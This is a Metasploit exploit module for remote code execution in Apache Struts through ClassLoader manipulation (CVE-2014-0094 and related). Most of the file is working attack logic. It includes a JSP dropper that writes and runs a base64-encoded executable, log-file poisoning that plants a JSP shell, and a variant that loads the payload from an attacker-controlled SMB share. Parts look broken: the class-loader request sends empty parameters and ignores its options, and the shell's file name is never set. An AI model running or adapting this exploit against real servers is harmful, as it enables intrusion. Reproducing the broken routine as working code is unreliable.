# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking # It&#039;s going to manipulate the Class Loader
 
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SMB::Server::Share
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts ClassLoader Manipulation Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution vulnerability in Apache Struts versions
        1.x (<= 1.3.10) and 2.x (< 2.3.16.2). In Struts 1.x the problem is related with
        the ActionForm bean population mechanism while in case of Struts 2.x the vulnerability is due
        to the ParametersInterceptor. Both allow access to &#039;class&#039; parameter that is directly
        mapped to getClass() method and allows ClassLoader manipulation. As a result, this can
        allow remote attackers to execute arbitrary Java code via crafted parameters.
      },
      &#039;Author&#039;         =>
        [
          &#039;Mark Thomas&#039;, # Vulnerability Discovery
          &#039;Przemyslaw Celej&#039;, # Vulnerability Discovery
          &#039;Redsadic <julian.vilas[at]gmail.com>&#039;, # Metasploit Module
          &#039;Matthew Hall <hallm[at]sec-1.com>&#039; # SMB target
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-0094&#039;],
          [&#039;CVE&#039;, &#039;2014-0112&#039;],
          [&#039;CVE&#039;, &#039;2014-0114&#039;],
          [&#039;URL&#039;, &#039;http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/&#039;],
          [&#039;URL&#039;, &#039;http://struts.apache.org/release/2.3.x/docs/s2-020.html&#039;],
          [&#039;URL&#039;, &#039;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Update-your-Struts-1-ClassLoader-manipulation-filters/ba-p/6639204&#039;],
          [&#039;URL&#039;, &#039;https://github.com/rgielen/struts1filter/tree/develop&#039;]
        ],
      &#039;Platform&#039;       => %w{ linux win },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 5000,
          &#039;DisableNops&#039; => true
        },
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039;        =>
        [
          [&#039;Java&#039;,
           {
               &#039;Arch&#039;     => ARCH_JAVA,
               &#039;Platform&#039; => %w{ linux win }
           },
          ],
          [&#039;Linux&#039;,
           {
               &#039;Arch&#039;     => ARCH_X86,
               &#039;Platform&#039; => &#039;linux&#039;
           }
          ],
          [&#039;Windows&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [&#039;Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)&#039;,
            {
              &#039;Arch&#039;     => ARCH_JAVA,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 06 2014&#039;,
      &#039;DefaultTarget&#039;  => 1))
 
    register_options(
      [
        Opt::RPORT(8080),
        OptEnum.new(&#039;STRUTS_VERSION&#039;, [ true, &#039;Apache Struts Framework version&#039;, &#039;2.x&#039;, [&#039;1.x&#039;,&#039;2.x&#039;]]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a struts application action&#039;, "/struts2-blank/example/HelloWorld.action"]),
        OptInt.new(&#039;SMB_DELAY&#039;, [true, &#039;Time that the SMB Server will wait for the payload request&#039;, 10])
      ], self.class)
 
    deregister_options(&#039;SHARE&#039;, &#039;FILE_NAME&#039;, &#039;FOLDER_NAME&#039;, &#039;FILE_CONTENTS&#039;)
  end
 
  def jsp_dropper(file, exe)
    dropper = <<-eos
<%@ page import=\"java.io.FileOutputStream\" %>
<%@ page import=\"sun.misc.BASE64Decoder\" %>
<%@ page import=\"java.io.File\" %>
<% FileOutputStream oFile = new FileOutputStream(\"#{file}\", false); %>
<% oFile.write(new sun.misc.BASE64Decoder().decodeBuffer(\"#{Rex::Text.encode_base64(exe)}\")); %>
<% oFile.flush(); %>
<% oFile.close(); %>
<% File f = new File(\"#{file}\"); %>
<% f.setExecutable(true); %>
<% Runtime.getRuntime().exec(\"./#{file}\"); %>
    eos
 
    dropper
  end
 
  def dump_line(uri, cmd = &#039;&#039;)
    res = send_request_cgi({
      &#039;uri&#039;     => uri,
      &#039;encode_params&#039; => false,
      &#039;vars_get&#039; => {
        cmd => &#039;&#039;
      },
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;
    })
 
    res
  end
 
  def modify_class_loader(opts)
 
      case datastore[&#039;STRUTS_VERSION&#039;]
      when &#039;1.x&#039; then "class.classLoader"
      when &#039;2.x&#039; then "class[&#039;classLoader&#039;]"
      end
 
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path.to_s),
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;vars_get&#039; => {
      }
    })
 
    res
  end
 
  def check_log_file(hint)
    uri = normalize_uri("/", @jsp_file)
 
    print_status("Waiting for the server to flush the logfile")
 
    10.times do |x|
      select(nil, nil, nil, 2)
 
      # Now make a request to trigger payload
      vprint_status("Countdown #{10-x}...")
      res = dump_line(uri)
 
      # Failure. The request timed out or the server went away.
      fail_with(Failure::TimeoutExpired, "#{peer} - Not received response") if res.nil?
 
      # Success if the server has flushed all the sent commands to the jsp file
      if res.code == 200 && res.body && res.body.to_s =~ /#{hint}/
        print_good("Log file flushed at http://#{peer}/#{@jsp_file}")
        return true
      end
    end
 
    false
  end
 
  # Fix the JSP payload to make it valid once is dropped
  # to the log file
  def fix(jsp)
    output = ""
    jsp.each_line do |l|
      if l =~ /<%.*%>/
        output << l
      elsif l =~ /<%/
        next
      elsif l=~ /%>/
        next
      elsif l.chomp.empty?
        next
      else
        output << "<% #{l.chomp} %>"
      end
    end
    output
  end
 
  def create_jsp
    if target[&#039;Arch&#039;] == ARCH_JAVA
      jsp = fix(payload.encoded)
    else
      if target[&#039;Platform&#039;] == &#039;win&#039;
        payload_exe = Msf::Util::EXE.to_executable_fmt(framework, target.arch, target.platform, payload.encoded, "exe-small", {:arch => target.arch, :platform => target.platform})
      else
        payload_exe = generate_payload_exe
      end
      payload_file = rand_text_alphanumeric(4 + rand(4))
      jsp = jsp_dropper(payload_file, payload_exe)
 
      register_files_for_cleanup(payload_file)
    end
 
    jsp
  end
 
  def exploit
    if target.name =~ /Remote SMB Resource/
      begin
        Timeout.timeout(datastore[&#039;SMB_DELAY&#039;]) { super }
      rescue Timeout::Error
        # do nothing... just finish exploit and stop smb server...
      end
    else
      class_loader_exploit
    end
  end
 
  # Used with SMB targets
  def primer
    self.file_name << &#039;.jsp&#039;
    self.file_contents = payload.encoded
    print_status("JSP payload available on #{unc}...")
 
    print_status("Modifying Class Loader...")
    send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path.to_s),
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;vars_get&#039; => {
        &#039;class[\&#039;classLoader\&#039;].resources.dirContext.docBase&#039; => "\\\\#{srvhost}\\#{share}"
      }
    })
 
    jsp_shell = target_uri.path.to_s.split(&#039;/&#039;)[0..-2].join(&#039;/&#039;)
    jsp_shell << "/#{self.file_name}"
 
    print_status("Accessing JSP shell at #{jsp_shell}...")
    send_request_cgi({
      &#039;uri&#039;     => normalize_uri(jsp_shell),
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;,
    })
  end
 
  def class_loader_exploit
    date_format = rand_text_numeric(1+rand(4))
 
    # Modify the Class Loader
 
    print_status("Modifying Class Loader...")
    properties = {
      :directory      => &#039;webapps/ROOT&#039;,
      :suffix         => &#039;.jsp&#039;,
      :file_date_format => date_format
    }
    res = modify_class_loader(properties)
    unless res
      fail_with(Failure::TimeoutExpired, "#{peer} - No answer")
    end
 
    # Check if the log file exists and has been flushed
 
    unless check_log_file(normalize_uri(target_uri.to_s))
      fail_with(Failure::Unknown, "#{peer} - The log file hasn&#039;t been flushed")
    end
 
    register_files_for_cleanup(@jsp_file)
 
    # Prepare the JSP
    print_status("Generating JSP...")
    jsp = create_jsp
 
    # Dump the JSP to the log file
    print_status("Dumping JSP into the logfile...")
    random_request = rand_text_alphanumeric(3 + rand(3))
 
    uri = normalize_uri(&#039;/&#039;, random_request)
 
    jsp.each_line do |l|
      unless dump_line(uri, l.chomp)
        fail_with(Failure::Unknown, "#{peer} - Missed answer while dumping JSP to logfile...")
      end
    end
 
    # Check log file... enjoy shell!
    check_log_file(random_request)
 
    # No matter what happened, try to &#039;restore&#039; the Class Loader
    properties = {
        :directory      => &#039;&#039;,
        :suffix         => &#039;&#039;,
        :file_date_format => &#039;&#039;
    }
    modify_class_loader(properties)
  end
 
end

